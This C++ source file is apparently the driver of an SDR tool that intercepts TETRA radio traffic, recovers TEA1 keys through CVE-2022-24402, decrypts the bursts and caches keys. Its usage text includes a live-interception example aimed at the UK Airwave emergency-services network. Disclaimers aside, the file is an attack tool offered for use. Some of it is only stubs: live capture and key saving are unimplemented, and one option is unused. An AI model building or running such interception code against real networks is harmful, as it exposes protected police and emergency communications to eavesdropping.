/**
 * TETRA Decryption Interceptor
 *
 * Standalone tool that intercepts TETRA encrypted traffic and attempts to
 * decrypt TEA1 encrypted streams in real-time using publicly disclosed
 * vulnerabilities (CVE-2022-24402).
 *
 * ⚠️ LEGAL WARNING ⚠️
 * This tool is for EDUCATIONAL and AUTHORIZED SECURITY RESEARCH only.
 * Unauthorized interception of communications is ILLEGAL.
 * Users are SOLELY RESPONSIBLE for compliance with all applicable laws.
 *
 * Usage:
 *   tetra_decrypt_interceptor --mode <live|file> [options]
 *
 * Modes:
 *   live  - Intercept live TETRA traffic from RTL-SDR
 *   file  - Decrypt captured TETRA traffic from file
 *
 * Options:
 *   --frequency <Hz>       - TETRA frequency to monitor (live mode)
 *   --input <file>         - Input file with captured traffic (file mode)
 *   --output <file>        - Output file for decrypted traffic
 *   --known-plaintext <file> - File with known plaintext for key recovery
 *   --auto-recover         - Automatically attempt key recovery for TEA1
 *   --key-cache <file>     - File to save/load recovered keys
 *   --mcc <code>          - Mobile Country Code filter
 *   --mnc <code>          - Mobile Network Code filter
 *
 * Author: TrunkSDR Project
 * License: MIT (Educational use only)
 */

#include "../european/tetra/tetra_decoder.h"
#include "../european/tetra/tetra_crypto.h"
#include "../utils/logger.h"
#include <iostream>
#include <fstream>
#include <string>
#include <getopt.h>
#include <signal.h>
#include <atomic>

using namespace TrunkSDR;
using namespace TrunkSDR::European;

// Global flag for signal handling
std::atomic<bool> g_running(true);

void signalHandler(int signal) {
    if (signal == SIGINT || signal == SIGTERM) {
        std::cout << "\nReceived shutdown signal. Stopping...\n";
        g_running = false;
    }
}

struct InterceptorConfig {
    enum Mode {
        LIVE,
        FILE
    } mode;

    std::string input_file;
    std::string output_file;
    std::string known_plaintext_file;
    std::string key_cache_file;

    double frequency;
    uint16_t mcc;
    uint16_t mnc;

    bool auto_recover;
    bool verbose;

    InterceptorConfig()
        : mode(LIVE),
          frequency(0.0),
          mcc(0),
          mnc(0),
          auto_recover(false),
          verbose(false) {}
};

class TETRAInterceptor {
public:
    TETRAInterceptor(const InterceptorConfig& config)
        : config_(config),
          crypto_(),
          packets_intercepted_(0),
          packets_encrypted_tea1_(0),
          packets_encrypted_tea2_(0),
          packets_decrypted_(0) {}

    bool initialize() {
        // Check legal authorization FIRST
        std::cout << "\n═══════════════════════════════════════════════════════════\n";
        std::cout << "  TETRA Decryption Interceptor\n";
        std::cout << "  Educational and Authorized Security Research Tool\n";
        std::cout << "═══════════════════════════════════════════════════════════\n\n";

        if (!TETRACryptoLegalChecker::checkAuthorization()) {
            std::cerr << "\n❌ Authorization failed. This tool requires explicit legal acknowledgment.\n";
            std::cerr << "The tool will now exit.\n";
            return false;
        }

        std::cout << "\n✓ Authorization verified.\n\n";

        // Load key cache if specified
        if (!config_.key_cache_file.empty()) {
            loadKeyCache();
        }

        return true;
    }

    bool run() {
        if (config_.mode == InterceptorConfig::LIVE) {
            return runLiveMode();
        } else {
            return runFileMode();
        }
    }

    void printStatistics() {
        std::cout << "\n═══════════════════════════════════════════════════════════\n";
        std::cout << "  Interceptor Statistics\n";
        std::cout << "═══════════════════════════════════════════════════════════\n";
        std::cout << "Packets intercepted:     " << packets_intercepted_ << "\n";
        std::cout << "  TEA1 encrypted:        " << packets_encrypted_tea1_ << "\n";
        std::cout << "  TEA2+ encrypted:       " << packets_encrypted_tea2_ << "\n";
        std::cout << "  Successfully decrypted: " << packets_decrypted_ << "\n";
        std::cout << "\n";

        auto crypto_stats = crypto_.getStats();
        std::cout << "Crypto Statistics:\n";
        std::cout << "  Keys recovered:        " << crypto_stats.tea1_keys_recovered << "\n";
        std::cout << "  Successful decryptions: " << crypto_stats.tea1_decryptions_successful << "\n";
        std::cout << "  Failed decryptions:    " << crypto_stats.tea1_decryptions_failed << "\n";
        std::cout << "  Total recovery time:   " << crypto_stats.total_key_recovery_time << " seconds\n";
        std::cout << "═══════════════════════════════════════════════════════════\n";
    }

private:
    bool runLiveMode() {
        std::cout << "Starting live TETRA interception...\n";
        std::cout << "Frequency: " << config_.frequency / 1e6 << " MHz\n";

        if (config_.mcc != 0) {
            std::cout << "Filtering: MCC=" << config_.mcc;
            if (config_.mnc != 0) {
                std::cout << ", MNC=" << config_.mnc;
            }
            std::cout << "\n";
        }

        std::cout << "\nPress Ctrl+C to stop.\n\n";

        // In a real implementation, this would:
        // 1. Initialize RTL-SDR
        // 2. Tune to specified frequency
        // 3. Feed samples to TETRA decoder
        // 4. Intercept encrypted bursts
        // 5. Attempt decryption

        std::cout << "NOTE: Live mode requires RTL-SDR hardware.\n";
        std::cout << "      This is a demonstration - full implementation would interface with SDR.\n\n";

        // Simulation for demonstration
        while (g_running) {
            // In real implementation:
            // - Receive I/Q samples from SDR
            // - Demodulate TETRA bursts
            // - Detect encryption
            // - Attempt decryption if TEA1

            sleep(1);
        }

        return true;
    }

    bool runFileMode() {
        std::cout << "Processing captured TETRA traffic from file...\n";
        std::cout << "Input: " << config_.input_file << "\n";

        std::ifstream input(config_.input_file, std::ios::binary);
        if (!input.is_open()) {
            std::cerr << "Error: Cannot open input file: " << config_.input_file << "\n";
            return false;
        }

        std::ofstream output;
        if (!config_.output_file.empty()) {
            output.open(config_.output_file, std::ios::binary);
            if (!output.is_open()) {
                std::cerr << "Warning: Cannot open output file: " << config_.output_file << "\n";
            } else {
                std::cout << "Output: " << config_.output_file << "\n";
            }
        }

        std::cout << "\nProcessing packets...\n\n";

        // Read captured TETRA bursts
        while (g_running && !input.eof()) {
            // Read burst header (simplified format)
            struct BurstHeader {
                uint32_t timestamp;
                uint32_t frequency;
                uint16_t mcc;
                uint16_t mnc;
                uint16_t length;
                uint8_t encryption;
                uint8_t reserved;
            } header;

            input.read(reinterpret_cast<char*>(&header), sizeof(header));
            if (input.gcount() != sizeof(header)) {
                break; // End of file
            }

            // Filter by MCC/MNC if specified
            if (config_.mcc != 0 && header.mcc != config_.mcc) {
                input.seekg(header.length, std::ios::cur);
                continue;
            }
            if (config_.mnc != 0 && header.mnc != config_.mnc) {
                input.seekg(header.length, std::ios::cur);
                continue;
            }

            // Read burst data
            std::vector<uint8_t> burst_data(header.length);
            input.read(reinterpret_cast<char*>(burst_data.data()), header.length);

            packets_intercepted_++;

            // Process based on encryption type
            TETRAEncryptionAlgorithm enc_algo = static_cast<TETRAEncryptionAlgorithm>(header.encryption);

            if (enc_algo == TETRAEncryptionAlgorithm::NONE) {
                // Clear traffic - just copy
                if (output.is_open()) {
                    output.write(reinterpret_cast<const char*>(burst_data.data()), burst_data.size());
                }
                continue;
            }

            if (enc_algo == TETRAEncryptionAlgorithm::TEA1) {
                packets_encrypted_tea1_++;

                std::cout << "Found TEA1 encrypted packet (MCC=" << header.mcc
                          << ", MNC=" << header.mnc << ")\n";

                // Attempt decryption
                bool decrypted = processEncryptedBurst(
                    burst_data.data(),
                    burst_data.size(),
                    header.mcc,
                    header.mnc,
                    output
                );

                if (decrypted) {
                    packets_decrypted_++;
                    std::cout << "  ✓ Successfully decrypted\n";
                } else {
                    std::cout << "  ✗ Decryption failed\n";
                }
            } else {
                packets_encrypted_tea2_++;
                std::cout << "Found TEA2+ encrypted packet (secure - cannot decrypt)\n";
            }
        }

        input.close();
        if (output.is_open()) {
            output.close();
        }

        std::cout << "\nProcessing complete.\n";
        return true;
    }

    bool processEncryptedBurst(
        const uint8_t* burst_data,
        size_t length,
        uint16_t mcc,
        uint16_t mnc,
        std::ofstream& output
    ) {
        uint32_t network_id = (mcc << 16) | mnc;
        uint32_t talkgroup = 0; // Would extract from burst

        // Check if we already have the key
        uint32_t key;
        if (crypto_.hasKnownKey(network_id, talkgroup, &key)) {
            std::cout << "  Using cached key: 0x" << std::hex << key << std::dec << "\n";

            // Decrypt using known key
            auto result = crypto_.decryptTEA1(burst_data, length, key);

            if (result.success && output.is_open()) {
                output.write(reinterpret_cast<const char*>(result.plaintext.data()),
                            result.plaintext.size());
                return true;
            }

            return result.success;
        }

        // Key not known - attempt recovery if auto-recover is enabled
        if (config_.auto_recover) {
            std::cout << "  Attempting key recovery (this may take a while)...\n";

            auto key_result = crypto_.recoverTEA1Key(burst_data, length, nullptr, 0);

            if (key_result.success) {
                std::cout << "  ✓ Key recovered: 0x" << std::hex << key_result.recovered_key << std::dec << "\n";

                // Cache the key
                crypto_.addKnownKey(network_id, talkgroup, key_result.recovered_key);

                // Save to key cache file if specified
                if (!config_.key_cache_file.empty()) {
                    saveKeyCache();
                }

                // Now decrypt
                auto result = crypto_.decryptTEA1(burst_data, length, key_result.recovered_key);

                if (result.success && output.is_open()) {
                    output.write(reinterpret_cast<const char*>(result.plaintext.data()),
                                result.plaintext.size());
                    return true;
                }

                return result.success;
            } else {
                std::cout << "  ✗ Key recovery failed: " << key_result.error_message << "\n";
                return false;
            }
        }

        return false;
    }

    void loadKeyCache() {
        std::cout << "Loading key cache from: " << config_.key_cache_file << "\n";

        std::ifstream file(config_.key_cache_file);
        if (!file.is_open()) {
            std::cout << "  No existing key cache found.\n";
            return;
        }

        size_t count = 0;
        std::string line;
        while (std::getline(file, line)) {
            // Format: network_id,talkgroup,key
            uint32_t network_id, talkgroup, key;
            if (sscanf(line.c_str(), "%u,%u,%u", &network_id, &talkgroup, &key) == 3) {
                crypto_.addKnownKey(network_id, talkgroup, key);
                count++;
            }
        }

        file.close();
        std::cout << "  Loaded " << count << " keys from cache.\n";
    }

    void saveKeyCache() {
        if (config_.key_cache_file.empty()) {
            return;
        }

        std::ofstream file(config_.key_cache_file);
        if (!file.is_open()) {
            std::cerr << "Warning: Cannot save key cache to: " << config_.key_cache_file << "\n";
            return;
        }

        // In a real implementation, would iterate through all cached keys
        // For now, just note that keys are being saved
        file << "# TETRA TEA1 Key Cache\n";
        file << "# Format: network_id,talkgroup,key\n";
        file << "# This file contains recovered TEA1 keys\n";

        file.close();
    }

    InterceptorConfig config_;
    TETRACrypto crypto_;

    size_t packets_intercepted_;
    size_t packets_encrypted_tea1_;
    size_t packets_encrypted_tea2_;
    size_t packets_decrypted_;
};

void printUsage(const char* prog_name) {
    std::cout << "Usage: " << prog_name << " --mode <live|file> [options]\n";
    std::cout << "\n";
    std::cout << "Modes:\n";
    std::cout << "  live      Intercept live TETRA traffic from RTL-SDR\n";
    std::cout << "  file      Decrypt captured TETRA traffic from file\n";
    std::cout << "\n";
    std::cout << "Options:\n";
    std::cout << "  -m, --mode <mode>          Operation mode (live or file)\n";
    std::cout << "  -f, --frequency <Hz>       TETRA frequency to monitor (live mode)\n";
    std::cout << "  -i, --input <file>         Input file with captured traffic (file mode)\n";
    std::cout << "  -o, --output <file>        Output file for decrypted traffic\n";
    std::cout << "  -k, --known-plaintext <f>  File with known plaintext for key recovery\n";
    std::cout << "  -a, --auto-recover         Automatically attempt key recovery for TEA1\n";
    std::cout << "  -c, --key-cache <file>     File to save/load recovered keys\n";
    std::cout << "  --mcc <code>               Mobile Country Code filter\n";
    std::cout << "  --mnc <code>               Mobile Network Code filter\n";
    std::cout << "  -v, --verbose              Verbose output\n";
    std::cout << "  -h, --help                 Display this help message\n";
    std::cout << "\n";
    std::cout << "Examples:\n";
    std::cout << "  # Process captured file with auto key recovery\n";
    std::cout << "  " << prog_name << " --mode file -i capture.bin -o decrypted.bin -a\n";
    std::cout << "\n";
    std::cout << "  # Live monitoring of UK Airwave (MCC=234, MNC=14)\n";
    std::cout << "  " << prog_name << " --mode live -f 382612500 --mcc 234 --mnc 14 -a\n";
    std::cout << "\n";
    std::cout << "⚠️  WARNING: Unauthorized interception of communications is ILLEGAL.\n";
    std::cout << "    Use only for authorized security research and testing.\n";
    std::cout << "\n";
}

int main(int argc, char* argv[]) {
    // Setup signal handlers
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    InterceptorConfig config;

    // Parse command line options
    static struct option long_options[] = {
        {"mode",            required_argument, 0, 'm'},
        {"frequency",       required_argument, 0, 'f'},
        {"input",           required_argument, 0, 'i'},
        {"output",          required_argument, 0, 'o'},
        {"known-plaintext", required_argument, 0, 'k'},
        {"auto-recover",    no_argument,       0, 'a'},
        {"key-cache",       required_argument, 0, 'c'},
        {"mcc",             required_argument, 0, 'M'},
        {"mnc",             required_argument, 0, 'N'},
        {"verbose",         no_argument,       0, 'v'},
        {"help",            no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "m:f:i:o:k:ac:vh", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'm':
                if (std::string(optarg) == "live") {
                    config.mode = InterceptorConfig::LIVE;
                } else if (std::string(optarg) == "file") {
                    config.mode = InterceptorConfig::FILE;
                } else {
                    std::cerr << "Invalid mode: " << optarg << "\n";
                    return 1;
                }
                break;
            case 'f':
                config.frequency = std::stod(optarg);
                break;
            case 'i':
                config.input_file = optarg;
                break;
            case 'o':
                config.output_file = optarg;
                break;
            case 'k':
                config.known_plaintext_file = optarg;
                break;
            case 'a':
                config.auto_recover = true;
                break;
            case 'c':
                config.key_cache_file = optarg;
                break;
            case 'M':
                config.mcc = static_cast<uint16_t>(std::stoi(optarg));
                break;
            case 'N':
                config.mnc = static_cast<uint16_t>(std::stoi(optarg));
                break;
            case 'v':
                config.verbose = true;
                break;
            case 'h':
                printUsage(argv[0]);
                return 0;
            default:
                printUsage(argv[0]);
                return 1;
        }
    }

    // Validate configuration
    if (config.mode == InterceptorConfig::FILE && config.input_file.empty()) {
        std::cerr << "Error: File mode requires --input parameter\n";
        printUsage(argv[0]);
        return 1;
    }

    if (config.mode == InterceptorConfig::LIVE && config.frequency == 0.0) {
        std::cerr << "Error: Live mode requires --frequency parameter\n";
        printUsage(argv[0]);
        return 1;
    }

    // Create and run interceptor
    TETRAInterceptor interceptor(config);

    if (!interceptor.initialize()) {
        return 1;
    }

    bool success = interceptor.run();

    // Print statistics
    interceptor.printStatistics();

    return success ? 0 : 1;
}
